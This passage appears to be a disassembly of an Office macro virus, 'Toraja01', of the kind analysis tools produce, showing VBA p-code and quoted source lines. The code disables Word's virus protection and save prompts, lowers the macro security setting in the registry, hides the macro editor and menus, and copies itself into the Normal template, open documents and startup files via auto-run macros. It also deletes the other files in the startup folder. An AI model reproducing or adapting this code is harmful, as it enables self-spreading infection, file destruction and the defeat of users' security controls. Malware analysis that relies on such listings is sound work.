' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #300:
' 	QuoteRem 0x0000 0x0009 "WordExcel"
' Line #301:
' 	QuoteRem 0x0000 0x002F "CommandBars("Ply").Controls("View Code").Delete"
' Line #302:
' 	QuoteRem 0x0000 0x0010 "With Application"
' Line #303:
' 	QuoteRem 0x0000 0x0051 "    .OnKey "%{F11}", "Serang": .OnKey "%{F8}", "Serang": .OnKey "%{F2}", "Serang""
' Line #304:
' 	QuoteRem 0x0000 0x0051 "    .OnKey "%{F4}", "Serang": .OnKey "{F12}", "Serang": .OnKey "^{o}", "OpenFile""
' Line #305:
' 	QuoteRem 0x0000 0x0008 "End With"
' Line #306:
' 	QuoteRem 0x0000 0x003E "CommandBars("Standard").Controls("Open").OnAction = "OpenFile""
' Line #307:
' 	QuoteRem 0x0000 0x005C "CommandBars("Worksheet Menu Bar").Controls("File").Controls("Open...").OnAction = "OpenFile""
' Line #308:
' 	QuoteRem 0x0000 0x005A "CommandBars("Worksheet Menu Bar").Controls("Window").Controls("Unhide...").Enabled = False"
' Line #309:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #310:
' 	QuoteRem 0x0000 0x000F "Sub WordExcel()"
' Line #311:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #312:
' 	QuoteRem 0x0000 0x0056 "For Each ctl In CommandBars.ActiveMenuBar.Controls("Tools").Controls("Macro").Controls"
' Line #313:
' 	QuoteRem 0x0000 0x001B "    ctl.OnAction = "Serang""
' Line #314:
' 	QuoteRem 0x0000 0x0008 "Next ctl"
' Line #315:
' 	QuoteRem 0x0000 0x007E "cmdBars CommandBars("Control Toolbox"), True: cmdBars CommandBars("Forms"), True: cmdBars CommandBars("ActiveX Control"), True"
' Line #316:
' 	QuoteRem 0x0000 0x007D "cmdBars CommandBars("Visual Basic"), True: cmdBars CommandBars.ActiveMenuBar, False: cmdBars CommandBars("Formatting"), False"
' Line #317:
' 	QuoteRem 0x0000 0x0026 "cmdBars CommandBars("Standard"), False"
' Line #318:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #319:
' 	QuoteRem 0x0000 0x0023 "Sub cmdBars(cmd, blnVis As Boolean)"
' Line #320:
' 	QuoteRem 0x0000 0x0008 "With cmd"
' Line #321:
' 	QuoteRem 0x0000 0x0049 "If blnVis = True Then .Enabled = False: .Visible = False: .Protection = 8"
' Line #322:
' 	QuoteRem 0x0000 0x0013 "    .Protection = 1"
' Line #323:
' 	QuoteRem 0x0000 0x0008 "End With"
' Line #324:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #325:
' 	QuoteRem 0x0000 0x000E "Sub MenuWord()"
' Line #326:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #327:
' 	QuoteRem 0x0000 0x0025 "CustomizationContext = NormalTemplate"
' Line #328:
' 	QuoteRem 0x0000 0x000C "With Options"
' Line #329:
' 	QuoteRem 0x0000 0x004A "    .VirusProtection = False: .SaveNormalPrompt = False: .SaveInterval = 0"
' Line #330:
' 	QuoteRem 0x0000 0x0008 "End With"
' Line #331:
' 	QuoteRem 0x0000 0x0052 "FindKey(BuildKeyCode(1024, 119)).Disable: FindKey(BuildKeyCode(1024, 112)).Disable"
' Line #332:
' 	QuoteRem 0x0000 0x0009 "WordExcel"
' Line #333:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #334:
' 	QuoteRem 0x0000 0x0010 "Sub SetCusProp()"
' Line #335:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #336:
' 	QuoteRem 0x0000 0x002D "Set CusProp = Active.CustomDocumentProperties"
' Line #337:
' 	QuoteRem 0x0000 0x0043 "CusProp.Add "Author", False, 4, "": CusProp.Add "cPrt", False, 1, 0"
' Line #338:
' 	QuoteRem 0x0000 0x0067 "If GetSetting(regApp, regSecSet, "AuthorKeyWord") = "Marsel" Then CusProp.Item("Author").Value = "Lina""
' Line #339:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #340:
' 	QuoteRem 0x0000 0x0020 "Function GetCreator() As Boolean"
' Line #341:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #342:
' 	QuoteRem 0x0000 0x0008 "Aplikasi"
' Line #343:
' 	QuoteRem 0x0000 0x002D "Set CusProp = Active.CustomDocumentProperties"
' Line #344:
' 	QuoteRem 0x0000 0x003F "If CusProp.Item("Author").Value = "Lina" Then GetCreator = True"
' Line #345:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #346:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #347:
' 	QuoteRem 0x0000 0x000D "Sub FoundIt()"
' Line #348:
' 	QuoteRem 0x0000 0x000A "TempActive"
' Line #349:
' 	QuoteRem 0x0000 0x0010 "blnFound = False"
' Line #350:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #351:
' 	QuoteRem 0x0000 0x001B "Function Tator() As Boolean"
' Line #352:
' 	QuoteRem 0x0000 0x003F "If (KeyWord = False) And (GetCreator = False) Then Tator = True"
' Line #353:
' 	QuoteRem 0x0000 0x000C "End Function"
' Line #354:
' 	QuoteRem 0x0000 0x000E "Sub Aplikasi()"
' Line #355:
' 	QuoteRem 0x0000 0x0038 "If Application.Name = "Microsoft Word" Then Doc Else Xls"
' Line #356:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #357:
' 	QuoteRem 0x0000 0x0009 "Sub Doc()"
' Line #358:
' 	QuoteRem 0x0000 0x0009 "ThisDocNT"
' Line #359:
' 	QuoteRem 0x0000 0x000F "CreateThisDocAD"
' Line #360:
' 	QuoteRem 0x0000 0x0099 "tempPath = Application.NormalTemplate.Path & Application.PathSeparator: Set Active = ActiveDocument: Set Temp = NormalTemplate: Set AllActive = Documents"
' Line #361:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #362:
' 	QuoteRem 0x0000 0x0009 "Sub Xls()"
' Line #363:
' 	QuoteRem 0x0000 0x008B "Set Active = ActiveWorkbook: Set Temp = Workbooks(fStartUp & Ver & ".XLS"): tempPath = Application.TemplatesPath: Set AllActive = Workbooks"
' Line #364:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #365:
' 	QuoteRem 0x0000 0x0015 "Sub CreateThisDocAD()"
' Line #366:
' 	QuoteRem 0x0000 0x0013 "On Error GoTo Salah"
' Line #367:
' 	QuoteRem 0x0000 0x0019 "Dim i, VBCompNT, VBCompAD"
' Line #368:
' 	QuoteRem 0x0000 0x0013 "Dim sLine As String"
' Line #369:
' 	QuoteRem 0x0000 0x004E "Set VBCompNT = NormalTemplate.VBProject.VBComponents(MacName & Ver).CodeModule"
' Line #370:
' 	QuoteRem 0x0000 0x004F "Set VBCompAD = ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule"
' Line #371:
' 	QuoteRem 0x0000 0x003A "If VBCompNT.CountOfLines <> VBCompAD.CountOfLines - 1 Then"
' Line #372:
' 	QuoteRem 0x0000 0x0031 "    VBCompAD.DeleteLines 1, VBCompAD.CountOfLines"
' Line #373:
' 	QuoteRem 0x0000 0x0026 "    For i = 1 To VBCompNT.CountOfLines"
' Line #374:
' 	QuoteRem 0x0000 0x0025 "         sLine = VBCompNT.Lines(i, 1)"
' Line #375:
' 	QuoteRem 0x0000 0x0082 "        If Left(sLine, 1) = "'" Then VBCompAD.InsertLines i, Right(sLine, Len(sLine) - 1) Else VBCompAD.InsertLines i, "'" & sLine"
' Line #376:
' 	QuoteRem 0x0000 0x000A "    Next i"
' Line #377:
' 	QuoteRem 0x0000 0x0006 "End If"
' Line #378:
' 	QuoteRem 0x0000 0x0006 "Salah:"
' Line #379:
' 	QuoteRem 0x0000 0x0007 "End Sub"
' Line #380:
' 	FuncDefn (Function CheckComp(Tujuan, id_FFFE As Variant))
' Line #381:
' 	Dim 
' 	VarDefn i
' 	VarDefn x
' 	VarDefn VBComp
' Line #382:
' 	Dim 
' 	VarDefn sLine (As String)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn blnM (As Boolean)
' Line #383:
' 	Dim (Const) 
' 	LitStr 0x0008 "Toraja01"
' 	VarDefn mName
' Line #384:
' 	LitVarSpecial (False)
' 	St blnM 
' Line #385:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #386:
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld VBComp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference To Normal"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #387:
' 	LineCont 0x0008 15 00 0B 00 24 00 0C 00
' 	Ld VBComp 
' 	MemLd New 
' 	Ld mName 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld mName 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnM 
' 	Else 
' 	BoSImplicit 
' 	GoSub RemoveKomp 
' 	EndIf 
' 	Else 
' 	BoSImplicit 
' 	GoSub RemoveKomp 
' 	EndIf 
' Line #388:
' 	EndIfBlock 
' Line #389:
' 	StartForVariable 
' 	Ld VBComp 
' 	EndForVariable 
' 	NextVar 
' Line #390:
' 	Ld blnM 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #391:
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St x 
' Line #392:
' 	LitDI2 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #393:
' 	Ld mName 
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #394:
' 	SetStmt 
' 	Ld mName 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set VBComp 
' Line #395:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #396:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St sLine 
' Line #397:
' 	Ld sLine 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld i 
' 	Ld sLine 
' 	Ld sLine 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Ld VBComp 
' 	ArgsMemCall InsertLines 0x0002 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitStr 0x0001 "'"
' 	Ld sLine 
' 	Concat 
' 	Ld VBComp 
' 	ArgsMemCall InsertLines 0x0002 
' 	EndIf 
' Line #398:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #399:
' 	Ld Tujuan 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Tujuan 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #400:
' 	EndIfBlock 
' Line #401:
' 	Label Salah 
' Line #402:
' 	ExitFunc 
' Line #403:
' 	Label RemoveKomp 
' Line #404:
' 	Ld VBComp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	Return 
' Line #405:
' 	EndFunc 
' Line #406:
' 	FuncDefn (Sub AutoClose())
' Line #407:
' 	OnError (Resume Next) 
' Line #408:
' 	Ld NormalTemplate 
' 	ArgsCall CheckComp 0x0001 
' Line #409:
' 	Ld ActiveDocument 
' 	ArgsCall CheckComp 0x0001 
' Line #410:
' 	LitStr 0x0009 "RemoveAll"
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #411:
' 	EndSub 
' Line #412:
' Line #413:
' 	QuoteRem 0x0000 0x0000 ""
' Line #414:
' Line #415:
' 	QuoteRem 0x0000 0x0000 ""
' Line #416:
' Macros/VBA/Toraja01 - 26366 bytes
' Line #0:
' 	Rem 0x0026 " Created       : Toraja High Land 1998"
' Line #1:
' 	Rem 0x001A " Modified      : July 1999"
' Line #2:
' 	Rem 0x003F " --------------------------------------------------------------"
' Line #3:
' 	Option  (Explicit)
' Line #4:
' 	Option  (Compare Text)
' Line #5:
' 	Dim 
' 	VarDefn Komp (As Variant)
' 	VarDefn ctl
' Line #6:
' 	Dim (Public Const) 
' 	LitStr 0x000B "Application"
' 	VarDefn regApp (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0008 "Settings"
' 	VarDefn regSecSet (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0004 "Tana"
' 	VarDefn TempName (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0006 "Toraja"
' 	VarDefn MacName (As String)
' Line #7:
' 	Dim (Public Const) 
' 	LitStr 0x0009 "AutoStart"
' 	VarDefn fStartUp (As String)
' 	BoS 0x0000 
' 	Dim (Public Const) 
' 	LitStr 0x0002 "01"
' 	VarDefn Ver (As String)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn CusProp
' 	VarDefn actWindow
' Line #8:
' 	Dim (Global) 
' 	VarDefn Active
' 	VarDefn Temp
' 	VarDefn tempPath
' 	VarDefn AllActive
' 	VarDefn blnFound (As Boolean)
' 	VarDefn blnXls (As Boolean)
' 	VarDefn blnMod (As Boolean)
' Line #9:
' 	FuncDefn (Sub Register())
' Line #10:
' 	OnError (Resume Next) 
' Line #11:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	Ld Date 
' 	LitDI2 0x001E 
' 	Add 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #12:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ld MacName 
' 	Concat 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #13:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	LitStr 0x0000 ""
' 	ArgsCall SaveSetting 0x0004 
' 	EndIf 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Function Serang() As Boolean)
' Line #16:
' 	Dim 
' 	VarDefn getDate (As Date)
' Line #17:
' 	OnError (Resume Next) 
' Line #18:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x0008 "FirstRun"
' 	ArgsLd GetSetting 0x0003 
' 	St getDate 
' Line #19:
' 	Ld getDate 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Ld Date 
' 	LitStr 0x000A "dd-mm-yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001F "This command not available now."
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' 	EndIf 
' Line #20:
' 	EndFunc 
' Line #21:
' 	FuncDefn (Sub AutoExec())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #24:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #25:
' 	Ld MacroContainer 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0003 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #28:
' 	ArgsCall MenuWord 0x0000 
' Line #29:
' 	ArgsCall Register 0x0000 
' Line #30:
' 	ElseBlock 
' Line #31:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Ld NormalTemplate 
' 	LitVarSpecial (False)
' 	ArgsCall KompProject 0x0003 
' Line #32:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #34:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #38:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #39:
' 	ArgsCall TempActive 0x0000 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub AutoNew())
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	ArgsCall TempActive 0x0000 
' Line #45:
' 	LitDI2 0x0003 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #46:
' 	EndSub 
' Line #47:
' 	FuncDefn (Function RemStartUp(fPath) As Boolean)
' Line #48:
' 	OnError Salah 
' Line #49:
' 	LitVarSpecial (False)
' 	St blnXls 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St blnFound 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #50:
' 	Ld fPath 
' 	LitDI2 0x0010 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #51:
' 	Ld fPath 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Or 
' 	LitDI2 0x0002 
' 	Or 
' 	ArgsLd Dir 0x0002 
' 	St Komp 
' Line #52:
' 	Ld Komp 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #53:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #54:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnFound 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Add 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #55:
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnXls 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #56:
' 	LineCont 0x0008 19 00 07 00 2E 00 07 00
' 	Ld Komp 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Ld Komp 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	Ne 
' 	And 
' 	Ld Komp 
' 	LitStr 0x000C "MSCREATE.DIR"
' 	Ne 
' 	And 
' 	Ld Komp 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 "~$"
' 	Ne 
' 	And 
' 	Ld Komp 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	BoS 0x0000 
' 	Ld fPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #57:
' 	Ld Dir 
' 	St Komp 
' Line #58:
' 	Loop 
' Line #59:
' 	Ld blnMod 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St RemStartUp 
' 	EndIf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	ExitFunc 
' Line #62:
' 	Label Salah 
' Line #63:
' 	Resume (Next) 
' Line #64:
' 	EndFunc 
' Line #65:
' 	FuncDefn (Sub AutoOpen())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Dim 
' 	VarDefn strRun (As String)
' Line #68:
' 	ArgsCall ActiveTemp 0x0000 
' Line #69:
' 	ArgsCall RemoveAll 0x0000 
' Line #70:
' 	ArgsCall MenuWord 0x0000 
' Line #71:
' 	ArgsCall Register 0x0000 
' Line #72:
' 	Ld blnFound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #73:
' 	Ld TempName 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	Ld MacName 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0008 ".FoundIt"
' 	Concat 
' 	St strRun 
' Line #74:
' 	Ld Now 
' 	LitStr 0x0008 "00:01:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	Ld strRun 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub AutoExit())
' Line #78:
' 	OnError (Resume Next) 
' Line #79:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #80:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #81:
' 	Ld MacroContainer 
' 	LitStr 0x000A "Normal.dot"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	ArgsCall ExportXls 0x0000 
' Line #83:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsLd RemStartUp 0x0001 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #84:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #85:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #86:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".dot"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Function KeyWord() As Boolean)
' Line #91:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000B "UserKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	Ld Ver 
' 	Ld MacName 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KeyWord 
' 	EndIf 
' Line #92:
' 	EndFunc 
' Line #93:
' 	FuncDefn (Sub FileOpen())
' Line #94:
' 	OnError (Resume Next) 
' Line #95:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #96:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #97:
' 	ArgsCall TempActive 0x0000 
' Line #98:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Function KompProject(Asal, Tujuan, blnEIKMod As Boolean) As Boolean)
' Line #101:
' 	OnError Salah 
' Line #102:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #103:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #104:
' 	LineCont 0x0004 11 00 06 00
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x0013 "Reference To Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Sheet"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Komp 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Chart"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #105:
' 	LineCont 0x0008 19 00 0B 00 28 00 0C 00
' 	Ld Komp 
' 	MemLd New 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	Else 
' 	BoSImplicit 
' 	GoSub RemoveKomp 
' 	EndIf 
' 	Else 
' 	BoSImplicit 
' 	GoSub RemoveKomp 
' 	EndIf 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	Ld blnEIKMod 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld blnMod 
' 	LitVarSpecial (False)
